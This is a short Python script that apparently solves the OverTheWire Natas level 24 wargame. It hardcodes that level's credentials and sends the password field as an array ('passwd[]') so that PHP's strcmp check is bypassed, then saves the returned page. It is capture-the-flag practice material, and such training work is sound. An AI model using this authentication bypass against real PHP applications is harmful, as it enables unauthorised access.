#!/usr/bin/env python

import requests
import re

username = 'natas24'
password = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()
# response = session.get(url, auth=(username, password))
response = session.post(url, data={'passwd[]': 'gzzz'}, auth=(username, password))

content = response.text
print(content)
print('='*80)

output = open('output.html', 'w')
output.write(content)

# PHP strcmp Abuse